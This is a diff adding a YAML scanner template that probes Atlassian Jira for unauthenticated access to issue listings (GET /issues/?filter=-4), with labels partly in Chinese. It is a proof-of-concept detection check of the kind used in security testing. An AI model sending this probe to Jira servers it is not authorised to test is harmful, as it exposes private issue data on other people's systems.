@@ -1,0 +1,16 @@
+id: poc-yaml-jira-information-disclosure
+info:
+  name: Atlassian Jira issue 未授权访问漏洞
+  severity: low
+  tags:
+  - 未授权访问
+  finger: Atlassian Jira
+  osprey-id: vb_2018_0022
+requests:
+- method: GET
+  path: /issues/?filter=-4
+  headers: {}
+  data: null
+  expression: contains(body, "<ol class=\"issue-list\"><li") && contains(body, "jira")
+variables: {}
+transport: http
